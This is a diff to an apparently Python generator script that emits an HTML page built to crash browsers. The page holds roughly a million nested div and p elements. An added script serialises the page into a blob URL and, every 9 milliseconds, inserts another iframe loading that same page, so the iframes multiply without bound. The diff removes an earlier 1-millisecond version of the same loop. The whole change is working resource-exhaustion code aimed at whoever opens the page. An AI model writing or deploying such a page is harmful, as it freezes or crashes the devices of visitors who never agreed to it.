@@ -51,25 +51,50 @@ background: radial-gradient(rgba(0, 0, 0, 0.1) 90%, rgba(1, 1, 1, 0.5) 99%), tra
 background-blend-mode: screen;
 mix-blend-mode: screen;
 }
+iframe.terrible {
+z-index: -1;
+transform: scale(0.99) rotate(1grad);
+opacity: 0.99;
+animation: 9s ease-in-out 9s infinite alternate pain;
+}
+@keyframes pain {
+0% {
+transform: scale(0.99) rotate(1grad);
+opacity: 0.99;
+}
+50% {
+transform: scale(1) rotate(0);
+opacity: 1;
+}
+100% {
+transform: scale(0.99) rotate(-1grad);
+opacity: 0.99;
+}
+}
 </style>
-<script>
-"use strict";
-document.addEventListener("DOMContentLoaded", () => {
-const frame = document.createElement("iframe");
-frame.sandbox = "allow-scripts";
-frame.credentialless = true;
-frame.loading = "lazy";
-const html = ["<!DOCTYPE html>\n" + document.documentElement.outerHTML];
-frame.src = URL.createObjectURL(new Blob(html, { type: "text/html" }));
-setInterval(() => document.body.appendChild(frame.cloneNode(true)), 1);
-});
-</script>
 <body>
 '''
+    SUFFIX = r'''
+<iframe class="terrible" sandbox="allow-scripts" credentialless loading="lazy" src="index.html"></iframe>
+<script>
+"use strict";
+document.getElementsByTagName("iframe")[0].src = "";
+document.addEventListener("DOMContentLoaded", () => {
+    const htmlContent = ["<!DOCTYPE html>\n" + document.documentElement.outerHTML];
+    const blobUrl = URL.createObjectURL(new Blob(htmlContent, { type: "text/html" }));
+    const firstFrame = document.querySelector(".terrible");
+    firstFrame.src = blobUrl + "#" + Math.random().toString();
+    setInterval(() => {
+        const newFrame = firstFrame.cloneNode(true);
+        newFrame.src = blobUrl + "#" + Math.random().toString();
+        firstFrame.insertAdjacentElement("afterend", newFrame);
+    }, 9);
+});
+</script>'''
     ELEM = r'<div><p>'
     elem_arr = [ELEM] * 1048000
     elem_str = ''.join(elem_arr)
-    return PREFIX + elem_str
+    return PREFIX + elem_str + SUFFIX
 
 
 if __name__ == '__main__':
